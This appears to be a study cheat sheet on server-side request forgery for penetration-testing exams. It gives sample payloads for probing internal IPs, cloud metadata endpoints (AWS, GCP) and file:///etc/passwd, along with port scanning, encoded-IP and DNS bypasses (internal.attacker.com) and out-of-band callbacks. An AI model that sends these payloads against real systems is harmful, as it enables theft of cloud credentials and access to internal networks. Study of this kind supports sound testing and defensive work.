## Server-Side — SSRF (Server-Side Request Forgery)

## Objective
Force the server to make requests on your behalf to:
- Internal services
- Cloud metadata
- Restricted endpoints

Think: *“Can I make the server talk to something I can’t?”*

---

## 1. What is SSRF

Server fetches a URL based on user input:

```json
{"url": "http://example.com"}
```

→ You control `url` → server makes request

---

## 2. Where to Look

Common parameters:

```json
"url"
"uri"
"link"
"callback"
"redirect"
"image"
"avatar"
"webhook"
```

---

### Typical features

- URL fetchers
- Image upload via URL
- Webhooks
- PDF generators
- Import / sync features

---

## 3. Basic Detection

### Step 1: Send external request

```json
{"url": "http://your-server.com"}
```

→ Check if server hits you

---

### Step 2: Test localhost

```json
{"url": "http://127.0.0.1"}
{"url": "http://localhost"}
```

---

### Step 3: Internal network

```json
{"url": "http://192.168.1.1"}
{"url": "http://10.0.0.1"}
```

---

## 4. Basic SSRF Exploitation

### A. Access internal services

```json
{"url": "http://127.0.0.1:8080"}
{"url": "http://localhost/admin"}
```

---

### B. Cloud metadata (HIGH VALUE)

#### AWS
```json
{"url": "http://169.254.169.254/latest/meta-data/"}
```

#### GCP
```json
{"url": "http://metadata.google.internal/"}
```

---

### C. File access (if supported)

```json
{"url": "file:///etc/passwd"}
```

---

### D. Port scanning via SSRF

```json
{"url": "http://127.0.0.1:22"}
{"url": "http://127.0.0.1:3306"}
```

→ Different responses = open/closed ports

---

## 5. Bypass Techniques

### A. Alternative IP formats

```json
"http://127.0.0.1"
"http://2130706433"
"http://0x7f000001"
```

---

### B. DNS bypass

```json
"http://internal.attacker.com"
```

→ Resolve to internal IP

---

### C. URL encoding

```json
"http://127.0.0.1%2fadmin"
```

---

### D. Redirect chaining

1. Send request to your server
2. Redirect → internal target

---

## 6. Blind SSRF

No response visible

### Detect with OOB

```json
{"url": "http://your-server.com"}
```

→ Monitor logs / Burp Collaborator

---

## 7. Indicators of SSRF

- Server makes external requests
- Response contains internal data
- Timeout differences
- Different responses per IP/port

---

## 8. Common Vulnerabilities

- No URL validation
- Weak blacklist (localhost only)
- Allowing internal IP access
- Following redirects blindly

---

## 9. Fast Workflow (Exam Mode)

1. Identify URL parameter
2. Send request to your server
3. Test:
   - localhost
   - internal IPs
4. Try metadata endpoint
5. Attempt bypass:
   - encoded IP
   - alternative formats
6. Check for:
   - data leak
   - response differences
   - callbacks

---

## 10. Mental Model

You are not attacking directly.

You are:
→ Controlling the server as a proxy

Goal:
→ Make it access what you cannot